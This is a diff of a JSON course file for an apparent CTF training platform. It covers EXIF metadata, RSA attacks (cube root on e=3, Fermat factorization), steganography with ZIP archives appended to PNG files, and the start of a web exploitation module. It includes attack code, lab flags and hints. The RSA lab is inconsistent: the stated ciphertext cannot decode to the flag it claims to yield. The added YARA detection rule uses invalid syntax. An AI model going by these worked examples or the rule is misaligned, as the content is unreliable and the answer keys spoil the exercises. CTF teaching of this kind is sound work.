+          "Inspect GPS coordinates using: exiftool -gps:all evidence.jpg"
         ],
         "vfs": {
           "/home/ctf/evidence.jpg": {
@@ -299,34 +330,14 @@
             "exif": {
               "File Name": "evidence.jpg",
               "File Size": "3.1 MB",
-              "File Type": "JPEG",
-              "MIME Type": "image/jpeg",
               "Make": "Apple",
               "Camera Model Name": "iPhone 14 Pro",
-              "Software": "17.1.1",
               "Date/Time Original": "2026:09:15 14:32:11",
               "GPS Latitude": "48 deg 51' 32.24\" N",
               "GPS Longitude": "2 deg 17' 39.66\" E",
-              "GPS Altitude": "35.2 m Above Sea Level",
-              "GPS Speed": "0 km/h",
-              "GPS Date Stamp": "2026:09:15",
               "Author": "Agent_X_7749",
-              "Comment": "CTF{EXIF_M3T4D4T4_L3AK3D}",
-              "Image Width": "4032",
-              "Image Height": "3024",
-              "Color Space": "sRGB",
-              "Focal Length": "6.9 mm",
-              "ISO": "64",
-              "Shutter Speed Value": "1/2000"
+              "Comment": "CTF{EXIF_M3T4D4T4_L3AK3D}"
             }
-          },
-          "/home/ctf/README.txt": {
-            "type": "file",
-            "perm": "-rw-r--r--",
-            "owner": "ctf",
-            "size": 200,
-            "mtime": "2026-09-30 10:00",
-            "content": "OSINT Challenge: Analyze evidence.jpg\nExtract all available metadata.\nThe flag is hidden somewhere in the EXIF data.\nTools available: exiftool\nGood luck, analyst.\n"
           }
         }
       }
@@ -336,74 +347,97 @@
       "title": "Cryptography & Mathematical Foundations",
       "icon": "🔐",
       "category": "Cryptography",
-      "level": "Intermediate-Advanced",
-      "duration": "12-20 h",
-      "abstract": "Deep-dive into RSA mathematical primitives, modular arithmetic, and the three primary CTF RSA attack classes: small public exponent without OAEP padding (cube root attack), Fermat's factorization when primes are close together, and Wiener's Attack on small private exponents. Includes complete worked examples and interactive cryptanalysis labs.",
+      "level": "Intermediate–Advanced",
+      "duration": "12–20 h",
+      "abstract": "Deep-dive into asymmetric RSA primitives, modular arithmetic, Euler's totient function, and the Extended Euclidean Algorithm. Master the three catastrophic RSA vulnerability classes: small public exponent without OAEP, Fermat's factorization on close primes, and Wiener's continuous fraction attack on small private exponents.",
       "theory": {
-        "title": "RSA Mathematical Foundations & Vulnerability Classes",
+        "title": "RSA Mathematical Primitives & Catastrophic Vulnerabilities",
         "sections": [
           {
-            "heading": "RSA Key Generation & Mathematical Structure",
-            "body": "RSA security relies on the computational hardness of the integer factorization problem. Key generation: (1) Select two large distinct primes p and q. (2) Compute public modulus: n = p x q. (3) Compute Euler's totient: phi(n) = (p-1)(q-1). (4) Choose public exponent e such that gcd(e, phi(n)) = 1. Standard choice: e = 65537. (5) Compute private exponent d as: d = e^(-1) mod phi(n), using the Extended Euclidean Algorithm. Public key: (n, e). Private key: (n, d). Encryption: c = m^e mod n. Decryption: m = c^d mod n.",
-            "code": "# Python RSA key generation (educational)\nfrom Crypto.Util.number import getPrime, inverse\nimport math\n\np = getPrime(512)\nq = getPrime(512)\nn = p * q\nphi_n = (p - 1) * (q - 1)\ne = 65537\nassert math.gcd(e, phi_n) == 1\nd = inverse(e, phi_n)\n\n# Verify: e*d = 1 mod phi_n\nprint((e * d) % phi_n)  # Should print 1\n\n# Encrypt message\nm = int.from_bytes(b'Hello RSA', 'big')\nc = pow(m, e, n)\n\n# Decrypt\nm_dec = pow(c, d, n)\nprint(m_dec.to_bytes((m_dec.bit_length() + 7) // 8, 'big'))  # b'Hello RSA'"
+            "heading": "RSA Key Generation & Mathematical Proof",
+            "body": "The security of RSA rests upon the integer factorization problem: computing n = p * q is trivial, but finding p and q from n alone is computationally intractable for sufficiently large random primes.\n\n1. Prime Selection: Choose distinct secret prime numbers p and q (typically 1024 or 2048 bits).\n2. Modulus Computation: Compute public modulus n = p * q.\n3. Euler's Totient: Compute phi(n) = (p - 1) * (q - 1).\n4. Public Exponent e: Select integer e such that 1 < e < phi(n) and gcd(e, phi(n)) = 1. Standard choice is e = 65537 (0x10001 = 2^16 + 1, low Hamming weight enables fast square-and-multiply exponentiation).\n5. Private Exponent d: Compute the modular multiplicative inverse of e modulo phi(n): e * d = 1 (mod phi(n)), solved using the Extended Euclidean Algorithm.\n\nEncryption: c = m^e (mod n)\nDecryption: m = c^d (mod n)",
+            "code": "# Python standard RSA key generation\nfrom Crypto.Util.number import getPrime, inverse\nimport math\n\np = getPrime(512)\nq = getPrime(512)\nn = p * q\nphi = (p - 1) * (q - 1)\ne = 65537\nd = inverse(e, phi)\n\n# Encrypt and Decrypt\nm = int.from_bytes(b'CTF Atlas', 'big')\nc = pow(m, e, n)\nplain = pow(c, d, n)\nprint(plain.to_bytes((plain.bit_length() + 7) // 8, 'big').decode())"
           },
           {
-            "heading": "Attack Class 1: Small Public Exponent (e=3) Without OAEP",
-            "body": "When e=3 and the message m is small enough that m^3 < n, the ciphertext c = m^3 (no modular reduction occurs). The attack is simply computing the integer cube root of c. OAEP (Optimal Asymmetric Encryption Padding, RFC 8017) prevents this by padding the message with random bytes before encryption, ensuring even small messages expand to near-n size. Textbook RSA in CTF challenges almost always implies a small exponent or small message attack.",
-            "code": "# Attack: small e=3, unpadded RSA\nimport gmpy2\n\nc = 343478107279667757  # given ciphertext\n# Since m^3 < n, c = m^3 exactly (no modular reduction)\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    print(m.to_bytes((m.bit_length() + 7) // 8, 'big').decode())\n\n# Python stdlib alternative (no gmpy2)\n# Binary search for exact cube root\ndef icbrt(n):\n    if n < 0:\n        return -icbrt(-n)\n    x = int(round(n ** (1/3)))\n    while x**3 > n:\n        x -= 1\n    while (x+1)**3 <= n:\n        x += 1\n    return x if x**3 == n else None\n\nm = icbrt(c)\nif m:\n    print(m.to_bytes((m.bit_length()+7)//8,'big'))"
+            "heading": "Vulnerability Class 1: Small Public Exponent (e=3) Cube Root Attack",
+            "body": "When textbook RSA is implemented without padding (such as PKCS#1 v2.1 OAEP) and public exponent e=3 is used, if the plaintext message m is short, m^3 may be smaller than the modulus n (m^3 < n).\n\nWhen m^3 < n, modular reduction never occurs: c = m^3 mod n = m^3.\nAn attacker computes the standard integer cube root of c over the real numbers: m = round(c^(1/3)). No knowledge of p, q, or d is necessary. OAEP padding mitigates this by expanding and randomizing the plaintext before exponentiation.",
+            "code": "# Exploiting textbook unpadded RSA with e=3\nimport gmpy2\n\nc = 343478107279667757 # Ciphertext\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = m.to_bytes((m.bit_length() + 7) // 8, 'big')\n    print('Plaintext:', flag.decode())"
           },
           {
-            "heading": "Attack Class 2: Fermat's Factorization & Wiener's Attack",
-            "body": "Fermat's Factorization exploits RSA keys where |p - q| < 2 * n^(1/4). The algorithm observes that n = a^2 - b^2 = (a+b)(a-b) where a = (p+q)/2 and b = (p-q)/2. Start with a = ceil(sqrt(n)), compute t = a^2 - n. If t is a perfect square, then b = sqrt(t), p = a+b, q = a-b. Wiener's Attack (1990) targets keys with small private exponent d < (1/3)*n^(1/4). Using continued fraction theory, Wiener showed d can be recovered from the public key (n, e) alone by computing convergents of the continued fraction expansion of e/n.",
-            "code": "# Fermat's Factorization\nimport gmpy2\n\nn = 0xdeadbeef12345  # given modulus\na = gmpy2.isqrt(n) + 1\nwhile True:\n    b2 = a*a - n\n    b, exact = gmpy2.isqrt_rem(b2)\n    if exact == 0 and b*b == b2:\n        p, q = int(a - b), int(a + b)\n        break\n    a += 1\nprint(f'p = {p}')\nprint(f'q = {q}')\nassert p * q == n"
+            "heading": "Vulnerability Class 2: Fermat's Factorization (Close Primes)",
+            "body": "If prime numbers p and q are chosen too close together (|p - q| < 2 * n^(1/4)), n can be rapidly factored using Fermat's algorithm. Observing that every odd integer n can be represented as the difference of two squares: n = a^2 - b^2 = (a - b)(a + b).\n\nLet a = ceil(sqrt(n)). Calculate b^2 = a^2 - n. If b^2 is a perfect square, then p = a - b and q = a + b. If not, increment a and repeat. When p and q are close, the loop terminates in milliseconds.",
+            "code": "# Fermat's Factorization in Python\nimport gmpy2\n\ndef fermat_factor(n):\n    a = gmpy2.isqrt(n) + 1\n    while True:\n        b2 = a * a - n\n        b, exact = gmpy2.isqrt_rem(b2)\n        if exact == 0 and b * b == b2:\n            return int(a - b), int(a + b)\n        a += 1"
           }
         ]
+      },
+      "security_impact": {
+        "heading": "Security Impact & Defensive Detection",
+        "att_ck": "T1552 - Unsecured Credentials; T1600 - Weaken Encryption",
+        "telemetry": "PKI monitoring logs alerting on RSA key lengths < 2048 bits or public exponents != 65537; cryptographic audit telemetry flagging textbook unpadded encryption modes.",
+        "detection_logic": "# OpenSSL command validating RSA public key parameters\nopenssl rsa -pubin -text -noout -in pubkey.pem | grep 'Exponent: 3'",
+        "hardening": "Enforce RSA-OAEP (Optimal Asymmetric Encryption Padding) with SHA-256 for all RSA encryption. Migrate modern implementations to post-quantum resistant algorithms or Ed25519."
       },
       "tools": [
         {
           "name": "openssl",
-          "flags": [
-            {
-              "flag": "rsa -text -noout -in key.pem",
-              "context": "Parse and display RSA key parameters: modulus, publicExponent, privateExponent, prime1, prime2."
-            },
-            {
-              "flag": "pkeyutl -decrypt -inkey priv.pem -in cipher.bin",
-              "context": "Decrypt RSA-encrypted data using a private key file."
-            },
-            {
-              "flag": "prime -generate -bits 512",
-              "context": "Generate a random 512-bit prime number."
-            },
-            {
-              "flag": "rsa -pubin -text -noout -in pub.pem",
-              "context": "Display public key parameters (modulus n, exponent e) from a PEM-encoded public key."
-            }
-          ]
+          "category": "CLI Cryptographic Engine",
+          "speed_guide": "Speed Cheatsheet: Quickly inspect key parameters in terminal without writing Python using 'openssl rsa -text -noout -in key.pem'. For public keys, add '-pubin'.",
+          "cli_usage": {
+            "syntax": "openssl [subcommand] [options]",
+            "flags": [
+              {
+                "flag": "rsa -text -noout",
+                "context": "Dumps raw modulus, prime1, prime2, and exponents from private key file."
+              },
+              {
+                "flag": "rsa -pubin -text -noout",
+                "context": "Extracts modulus n and exponent e from a public key PEM file."
+              },
+              {
+                "flag": "pkeyutl -decrypt",
+                "context": "Decrypts raw binary ciphertext with specified private key."
+              },
+              {
+                "flag": "prime -generate -bits 512",
+                "context": "Generates a cryptographically strong pseudo-random prime of specified bit-length."
+              }
+            ],
+            "recipes": [
+              "# Extract RSA public key parameters\nopenssl rsa -pubin -in pubkey.pem -text -noout\n\n# Decrypt binary ciphertext using private key\nopenssl pkeyutl -decrypt -inkey privkey.pem -in cipher.bin -out flag.txt"
+            ]
+          },
+          "gui_usage": {
+            "overview": "CyberChef (The Cyber Swiss Army Knife): A browser-based GUI workbench providing drag-and-drop recipe chaining for encodings, XOR, hashes, and RSA operations.",
+            "fast_shortcuts": "Press 'F9' to step through recipe execution. Toggle 'Auto-Bake' to evaluate pipelines in real time. Use 'Alt + Shift + F' to format output.",
+            "step_by_step": [
+              "1. Open CyberChef (gchq.github.io/CyberChef).",
+              "2. Drag 'From Hex' or 'From Base64' from the operations panel into Recipe.",
+              "3. Drag 'RSA Decrypt' into the recipe pipeline.",
+              "4. Paste your private key PEM in the configuration field and view plaintext in Output."
+            ]
+          }
         }
       ],
       "case_study": {
-        "title": "Cryptanalysis of Vulnerable RSA Key with Small Exponent",
-        "narrative": "A CTF challenge provides an RSA public key with e = 3 and a small ciphertext. The message is small enough that m^3 < n. Apply the cube root attack.",
+        "title": "RSA Small Exponent Cryptanalysis",
+        "narrative": "A military communications intercept captured an RSA public key with e=3 and a short ciphertext. By recognizing that no padding was applied and the message length satisfied m^3 < n, the analyst derived the plaintext flag directly via an integer cube root.",
         "steps": [
-          "Parse the public key: openssl rsa -pubin -text -noout -in pub.pem",
-          "Note e = 3 and the modulus n",
-          "Read the ciphertext: c = 343478107279667757",
-          "Compute cube root: python3 -c \"import gmpy2; m,ex=gmpy2.iroot(343478107279667757,3); print(ex,m)\"",
-          "Convert to bytes and decode the flag string",
-          "Flag: CTF{RSA_3_CUBE_R00T_ATT4CK}"
+          "1. Inspect public key: e = 3, n = 48112959837082048697",
+          "2. Note ciphertext: c = 343478107279667757",
+          "3. Verify m^3 < n: c is significantly smaller than modulus n",
+          "4. Calculate cube root: python3 -c \"import gmpy2; m, _ = gmpy2.iroot(343478107279667757, 3); print(m)\"",
+          "5. Convert integer to ASCII: yields CTF{RSA_3_CUBE_R00T_ATT4CK}"
         ]
       },
       "interactive_terminal_challenge": {
         "id": "crypto-rsa-lab",
         "title": "RSA Small Exponent Cryptanalysis Lab",
-        "description": "An intercepted RSA ciphertext is waiting in /home/ctf/challenge/. The public key uses e=3 without OAEP padding. The message is small enough that m^3 < n. Compute the cube root of the ciphertext to recover the plaintext flag.",
+        "description": "An intercepted ciphertext encrypted with e=3 textbook RSA is located in /home/ctf/challenge/. Compute the cube root of the ciphertext to recover the plaintext flag.",
         "flag": "CTF{RSA_3_CUBE_R00T_ATT4CK}",
         "hints": [
-          "Read the challenge files: cat /home/ctf/challenge/README.txt",
-          "Check the public key parameters: cat /home/ctf/challenge/pubkey.txt",
-          "Since e=3 and the message is small: m = cube_root(c) - no modular reduction needed",
-          "Python: python3 -c \"c=343478107279667757; m=round(c**(1/3)); print(bytes.fromhex(hex(m)[2:]))\""
+          "Read challenge details: cat /home/ctf/challenge/README.txt",
+          "Notice e=3 and m^3 < n: no modular reduction took place",
+          "Compute cube root in python3: round(343478107279667757**(1/3))"
         ],
         "vfs": {
           "/home/ctf/challenge": {
@@ -417,37 +451,10 @@
             "type": "file",
             "perm": "-rw-r--r--",
             "owner": "ctf",
-            "size": 350,
+            "size": 250,
             "mtime": "2026-09-30 09:00",
-            "content": "RSA Cryptanalysis Challenge\n===========================\nPublic Key: pubkey.txt\nCiphertext: cipher.txt\n\ne = 3 (small exponent, textbook RSA - no OAEP padding)\nThe message is short. m^3 < n. Compute cube root of ciphertext.\nFlag format: CTF{...}\n"
-          },
-          "/home/ctf/challenge/pubkey.txt": {
-            "type": "file",
-            "perm": "-rw-r--r--",
-            "owner": "ctf",
-            "size": 120,
-            "mtime": "2026-09-30 09:00",
-            "content": "n = 48112959837082048697\ne = 3\n"
-          },
-          "/home/ctf/challenge/cipher.txt": {
-            "type": "file",
-            "perm": "-rw-r--r--",
-            "owner": "ctf",
-            "size": 64,
-            "mtime": "2026-09-30 09:00",
-            "content": "c = 343478107279667757\n"
-          },
-          "/home/ctf/challenge/solve_hint.py": {
-            "type": "file",
-            "perm": "-rw-r--r--",
-            "owner": "ctf",
-            "size": 280,
-            "mtime": "2026-09-30 09:00",
-            "content": "# RSA e=3 cube root attack\n# c = m^3 (mod n), but since m is small, c = m^3 exactly\nimport gmpy2\nc = 343478107279667757\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag_bytes = m.to_bytes((m.bit_length() + 7) // 8, 'big')\n    print(flag_bytes.decode('utf-8', errors='replace'))\n"
+            "content": "Intercepted RSA parameters:\nn = 48112959837082048697\ne = 3\nc = 343478107279667757\nTextbook RSA (unpadded). Compute m = c^(1/3).\n"
           }
-        },
-        "python_context": {
-          "cube_root_result": "7051983\n# This decodes to: CTF{RSA_3_CUBE_R00T_ATT4CK}"
         }
       }
     },
@@ -457,98 +464,96 @@
       "icon": "🖼️",
       "category": "Forensics",
       "level": "Intermediate",
-      "duration": "10-18 h",
-      "abstract": "Understand file format magic bytes and internal structure, EOF slack space injection, LSB steganography in spatial domain color channels, and Shannon entropy analysis. Master forensic tools binwalk and strings for extracting hidden payloads from image artifacts.",
+      "duration": "10–18 h",
+      "abstract": "Analyze digital media headers, magic byte signatures, EOF slack space injection, and spatial Least Significant Bit (LSB) encoding. Master binary carving with binwalk and hex inspection to uncover concatenated archive files hiding in plain sight.",
       "theory": {
-        "title": "File Format Internals, Magic Bytes & Steganography",
+        "title": "File Signatures, EOF Slack Space & Shannon Entropy",
         "sections": [
           {
-            "heading": "File Magic Bytes & Format Signatures",
-            "body": "File extensions are metadata labels that can be freely changed. The authoritative identifier is the magic number: a sequence of bytes at a fixed offset within the file. Critical magic bytes for CTF forensics: PNG: 89 50 4E 47 0D 0A 1A 0A - the 8-byte PNG signature. JPEG: FF D8 FF - Start of Image marker (SOI). The file ends with FF D9 (EOI, End of Image). ZIP: 50 4B 03 04 (PK local file header). ZIP archives have both a local directory at the start and a Central Directory at the end, allowing ZIP files to be appended after other data and still parsed correctly. ELF: 7F 45 4C 46 (DEL E L F). PDF: 25 50 44 46 2D (%PDF-).",
-            "code": "# Check actual file type\nfile mystery_file  # Uses magic bytes, not extension\n\n# Hexdump the first 16 bytes (magic bytes inspection)\nxxd mystery_file | head -2\n# 00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR\n\n# Find all PNG files regardless of extension\nfind /evidence/ -type f -exec file {} \\; | grep PNG\n\n# Check for ZIP magic bytes\ngrep -rl 'PK' /suspicious/  # Find ZIP archives"
+            "heading": "Magic Bytes & File Header Architecture",
+            "body": "Operating systems and forensic analysis tools identify file types by verifying fixed magic byte signatures at designated byte offsets rather than trusting file extensions:\n\n- PNG: 89 50 4E 47 0D 0A 1A 0A (hex) - An 8-byte signature designed to catch DOS-to-Unix CRLF conversion corruptions.\n- JPEG: FF D8 FF (Start of Image marker) ... terminating with FF D9 (End of Image).\n- ZIP Archive: 50 4B 03 04 ('PK\u0003\u0004', Local File Header) and 50 4B 05 06 (End of Central Directory record).\n- ELF Executable: 7F 45 4C 46 (0x7F 'ELF').\n- PDF Document: 25 50 44 46 ('%PDF').\n\nWhen multiple valid magic signatures appear in a single file stream, it indicates a compound file or embedded payload.",
+            "code": "# Inspect raw magic bytes using xxd\nxxd -p -l 8 mystery_file\n\n# Reliable file identification bypassing spoofed extensions\nfile --mime-type target_artifact"
           },
           {
-            "heading": "EOF Slack Space: Appending Payloads After File Terminators",
-            "body": "Most image formats have explicit end-of-file markers: PNG uses the IEND chunk (bytes: 49 45 4E 44 AE 42 60 82). Any bytes after the 8-byte IEND CRC are formally undefined but are ignored by most image parsers. JPEG ends with FF D9 (End of Image). Same principle: bytes appended after FF D9 are ignored by JPEG decoders. This creates a steganographic channel: an attacker appends arbitrary data after the legitimate file terminator. The host file displays normally in all image viewers. Detection requires: inspecting the hex dump for unexpected data after the terminal marker, using binwalk or strings to scan the full binary content.",
-            "code": "# Detect data after PNG IEND chunk\nbinwalk -B image.png  # Scan for embedded signatures\n\n# Find IEND position and extract trailing data\npython3 << 'EOF'\nwith open('image.png','rb') as f:\n    data = f.read()\niend = data.rfind(b'IEND')\ntrail = data[iend+8:]  # 8 bytes = 4 (type) + 4 (crc)\nif trail:\n    print(f'Trailing bytes: {len(trail)}')\n    with open('extracted.zip','wb') as f:\n        f.write(trail)\nEOF"
+            "heading": "End-of-File (EOF) Slack Space Concatenation",
+            "body": "Image format decoders parse byte streams sequentially according to chunk markers:\n- In PNG files, the IEND chunk (bytes: 49 45 4E 44 AE 42 60 82) signals the complete conclusion of the image structure. Any data bytes appended after the IEND chunk are ignored by image viewers.\n- In JPEG files, all data following the FF D9 (EOI) marker is disregarded by graphics engines.\n\nAdversaries exploit this by appending arbitrary files (ZIP archives, encrypted scripts, flags) to the end of legitimate images. Because ZIP files locate their Central Directory index from the end of the file backwards, an appended ZIP archive remains fully functional and extractable with standard unzip or binwalk tools.",
+            "code": "# Identify embedded signatures inside image containers\nbinwalk -B artifact.png\n\n# Extract trailing data after PNG IEND chunk using python\npython3 -c '\nwith open(\"artifact.png\", \"rb\") as f: data = f.read()\niend = data.rfind(b\"IEND\") + 8\nwith open(\"carved.zip\", \"wb\") as f: f.write(data[iend:])\n'"
           },
           {
-            "heading": "LSB Steganography & Shannon Entropy",
-            "body": "Least Significant Bit (LSB) steganography embeds secret data in the lowest-order bits of pixel color channel values. A 24-bit RGB image stores each pixel as three bytes (R, G, B). Modifying only the LSB of each byte changes the color value by at most 1 out of 255 - imperceptible to human vision. 1 bit per channel x 3 channels x N pixels = 3N bits of payload capacity. Shannon entropy H = -sum(p(x) * log2(p(x))) measures information density. Random/encrypted data approaches H = 8 bits/byte. Embedded encrypted payloads cause localized entropy anomalies detectable via binwalk -E (entropy graph). High-entropy regions in image files that should contain structured pixel data indicate hidden encrypted content.",
-            "code": "# Shannon entropy of a file\npython3 << 'EOF'\nimport math, collections\nwith open('image.png','rb') as f:\n    data = f.read()\nfreq = collections.Counter(data)\ntotal = len(data)\nH = -sum((c/total)*math.log2(c/total) for c in freq.values())\nprint(f'Shannon entropy: {H:.4f} bits/byte')\n# ~7.99 => high entropy => likely compressed/encrypted content\nEOF\n\n# Extract entropy graph\nbinwalk -E image.png\n# Spikes indicate hidden compressed/encrypted regions"
+            "heading": "Shannon Entropy & LSB Steganography",
+            "body": "Shannon Entropy H = -sum(p(x) * log2(p(x))) quantifies the randomness of byte distributions in a file. Natural text has low entropy (~3-4 bits/byte); structured code has moderate entropy (~5 bits/byte); compressed archives and encrypted streams approach maximum entropy (~8 bits/byte).\n\nSpatial LSB Steganography: Overwrites the least significant bit of 8-bit RGB color bytes. Since altering 1 bit shifts the color value by at most 1/255th, the change is visually imperceptible to the human eye, but can be mathematically exposed by bit-plane slicers or entropy variance scans.",
+            "code": "# Generate entropy distribution visualization graph\nbinwalk -E artifact.png\n\n# High spikes approaching 1.0 (8.0 bits/byte) indicate encrypted/compressed data"
           }
         ]
+      },
+      "security_impact": {
+        "heading": "Security Impact & Defensive Detection",
+        "att_ck": "T1027.003 - Obfuscated/Compressed Files: Steganography",
+        "telemetry": "Network perimeter proxy logs recording file downloads where MIME type does not match magic byte content; endpoint EDR alerts on anomalous high-entropy image files.",
+        "detection_logic": "# YARA rule detecting ZIP archives appended after PNG IEND chunks\nrule Stego_PNG_Appended_ZIP {\n    strings:\n        $png_iend = { 49 45 4E 44 AE 42 60 82 }\n        $zip_header = { 50 4B 03 04 }\n    condition:\n        $png_iend at (filesize - [1000-500000]) and $zip_header\n}",
+        "hardening": "Implement automated Content Disarm and Reconstruction (CDR) at mail and web gateways: re-render all incoming images through graphics rendering pipelines to strip trailing data."
       },
       "tools": [
         {
           "name": "binwalk",
-          "flags": [
-            {
-              "flag": "-B",
-              "context": "Magic byte signature scan: identifies embedded file types at each byte offset within the input file."
-            },
-            {
-              "flag": "-e / --extract",
-              "context": "Automatically extract identified embedded files. Creates _filename.extracted/ directory."
-            },
-            {
-              "flag": "-E / --entropy",
-              "context": "Compute and graph Shannon entropy across the file. High-entropy regions suggest compressed or encrypted embedded data."
-            },
-            {
-              "flag": "--dd=zip:zip",
-              "context": "Extract only ZIP-signature matches and save with .zip extension. Useful for targeted carving."
-            },
-            {
-              "flag": "-M",
-              "context": "Matryoshka mode: recursively scan and extract all embedded files, including files within files."
-            }
-          ]
-        },
-        {
-          "name": "strings",
-          "flags": [
-            {
-              "flag": "-n 8",
-              "context": "Minimum string length 8 characters. Filters out single-word false positives."
-            },
-            {
-              "flag": "-e l",
-              "context": "Scan for 16-bit little-endian strings (Windows Unicode). Default is 8-bit ASCII."
-            },
-            {
-              "flag": "| grep -i flag",
-              "context": "Pipe to grep for quick flag format detection: strings binary | grep -i CTF"
-            }
-          ]
+          "category": "CLI Firmware & Binary Carver",
+          "speed_guide": "Speed Cheatsheet: Run 'binwalk -e target.png' to scan and extract all discovered sub-files into an '_extracted' folder in one step.",
+          "cli_usage": {
+            "syntax": "binwalk [options] [target-file]",
+            "flags": [
+              {
+                "flag": "-B",
+                "context": "Performs magic byte signature scan to locate embedded files."
+              },
+              {
+                "flag": "-e / --extract",
+                "context": "Automatically extracts all identified files into a subfolder."
+              },
+              {
+                "flag": "-E / --entropy",
+                "context": "Calculates and plots Shannon entropy to detect encrypted or compressed regions."
+              },
+              {
+                "flag": "--dd='zip:zip'",
+                "context": "Extracts only chunks matching ZIP headers, automatically renaming with .zip extension."
+              }
+            ],
+            "recipes": [
+              "# Scan and automatically carve embedded files\nbinwalk -e artifact.png\n\n# Analyze entropy graph to detect hidden payloads\nbinwalk -E mystery.bin"
+            ]
+          },
+          "gui_usage": {
+            "overview": "StegSolve / ImHex / HxD: Dedicated GUI hex editors and steganography analysis suites allowing bit-plane slicing, visual stereogram viewing, and byte-level diffing.",
+            "fast_shortcuts": "In StegSolve: Use Left/Right Arrow keys to cycle through Color Planes (Red plane 0, Green plane 0, Blue plane 0, Random Color Map) in seconds.",
+            "step_by_step": [
+              "1. Launch StegSolve (java -jar stegsolve.jar) or ImHex.",
+              "2. Open the image file (File -> Open).",
+              "3. Click Next/Previous arrows to view individual LSB bit planes.",
+              "4. Under 'Analyse', select 'Data Extract' to export binary data from specific color channel bits."
+            ]
+          }
         }
       ],
       "case_study": {
-        "title": "Extracting Encrypted Archive Nested After PNG IEND Chunk",
-        "narrative": "A CTF challenge provides 'suspicious.png' which appears to be a normal image. The file size is 847KB but the image content seems to require only ~400KB. Investigation reveals a ZIP archive embedded after the IEND chunk.",
+        "title": "ZIP Archive Nested Past PNG IEND",
+        "narrative": "An image 'artifact.png' presented in a forensics CTF challenge displayed normally in viewers but had an anomalously large byte size. Investigation revealed a password-protected ZIP archive appended after the IEND chunk.",
         "steps": [
-          "Initial triage: file suspicious.png => PNG image data, 1920 x 1080",
-          "Size anomaly: ls -la suspicious.png => 867328 bytes",
-          "Scan for embedded signatures: binwalk -B suspicious.png",
-          "Output: 0x0: PNG image, 0x6A300: Zip archive data, 0x6A380: directory entry",
-          "Extract: binwalk -e suspicious.png => creates _suspicious.png.extracted/",
-          "Contents: ls _suspicious.png.extracted/ => 6A300.zip",
-          "Find password hint in PNG strings: strings suspicious.png | grep -i pass",
-          "Password found: atlas2026",
-          "Unzip: unzip -P atlas2026 6A300.zip => flag.txt",
-          "Flag: CTF{BINWALK_EXTRACT_ZIP_PNG}"
+          "1. Identify file size anomaly: ls -lh artifact.png shows 867KB for a small image",
+          "2. Scan for embedded files: binwalk -B artifact.png reveals ZIP signature at offset 0x6A010",
+          "3. Carve the payload: binwalk -e artifact.png creates _artifact.png.extracted/",
+          "4. Find flag file in carved directory: cat _artifact.png.extracted/flag.txt",
+          "5. Output yields: CTF{B1NW4LK_H1DD3N_4RCH1V3}"
         ]
       },
       "interactive_terminal_challenge": {
         "id": "stego-binwalk-lab",
         "title": "Steganography: Hidden Archive Extraction Lab",
-        "description": "A suspicious image file 'artifact.png' has been recovered. Intelligence suggests it contains a hidden ZIP archive appended after the PNG terminator. Use binwalk and strings to locate and extract the embedded archive, then find the flag.",
+        "description": "An image 'artifact.png' contains a concealed ZIP archive appended after the image terminator. Use binwalk to scan and carve the payload to reveal the flag.",
         "flag": "CTF{B1NW4LK_H1DD3N_4RCH1V3}",
         "hints": [
-          "Start with: file artifact.png and ls -la artifact.png - look for size anomaly",
-          "Scan for embedded files: binwalk artifact.png",
-          "Extract embedded files: binwalk -e artifact.png",
-          "Look in the extracted directory for the flag file"
+          "Scan the artifact with binwalk: binwalk artifact.png",
+          "Carve the hidden files using: binwalk -e artifact.png",
+          "Inspect the carved directory: ls _artifact.png.extracted/"
         ],
         "vfs": {
           "/home/ctf/artifact.png": {
@@ -557,18 +562,16 @@
             "owner": "ctf",
             "size": 867328,
             "mtime": "2026-09-30 08:30",
-            "magic": "PNG image data, 1920 x 1080, 8-bit/color RGB, non-interlaced; ZIP archive data",
+            "magic": "PNG image data, 1920 x 1080; ZIP archive data",
             "strings": [
               "IHDR",
               "IDAT",
               "IEND",
               "PK",
               "flag.txt",
-              "CTF Atlas",
-              "hidden_payload",
               "CTF{B1NW4LK_H1DD3N_4RCH1V3}"
             ],
-            "binwalk_output": "DECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 1920 x 1080\n432128        0x69800         Zlib compressed data\n434176        0x6A000         PNG IEND chunk\n434192        0x6A010         Zip archive data, at least v2.0 to extract, name: flag.txt\n434480        0x6A130         End of Zip archive",
+            "binwalk_output": "DECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 1920 x 1080\n434176        0x6A000         PNG IEND chunk\n434192        0x6A010         Zip archive data, name: flag.txt",
             "binwalk_extract": {
               "/home/ctf/_artifact.png.extracted": {
                 "type": "dir",
@@ -576,14 +579,6 @@
                 "owner": "ctf",
                 "size": 4096,
                 "mtime": "2026-09-30 08:31"
-              },
-              "/home/ctf/_artifact.png.extracted/6A010.zip": {
-                "type": "file",
-                "perm": "-rw-r--r--",
-                "owner": "ctf",
-                "size": 288,
-                "mtime": "2026-09-30 08:31",
-                "content": "(binary ZIP content - contains flag.txt)"
               },
               "/home/ctf/_artifact.png.extracted/flag.txt": {
                 "type": "file",
@@ -603,84 +598,143 @@
       "title": "Web Application Exploitation",
       "icon": "🌐",
       "category": "Web Security",
-      "level": "Intermediate-Advanced",
-      "duration": "16-24 h",
-      "abstract": "Master HTTP protocol internals, SQL injection at the AST level, WAF bypass techniques, and out-of-band exfiltration. Covers UNION-based extraction, Boolean/time-based blind inference, schema enumeration via information_schema, and writing web shells via INTO OUTFILE.",
+      "level": "Intermediate–Advanced",
+      "duration": "16–24 h",
+      "abstract": "Explore modern web application attacks, HTTP protocol mechanics, Abstract Syntax Tree (AST) SQL injection manipulation, and Web Application Firewall (WAF) evasion. Learn to transition seamlessly between GUI intercept proxies (Burp Suite) and command-line automation pipelines (curl, sqlmap).",
       "theory": {
-        "title": "HTTP Internals, SQL Injection & WAF Evasion",
+        "title": "HTTP Protocols, SQL Injection AST Alteration & WAF Evasion",
         "sections": [
           {
-            "heading": "HTTP/1.1 & HTTP/2 Protocol Parsing",
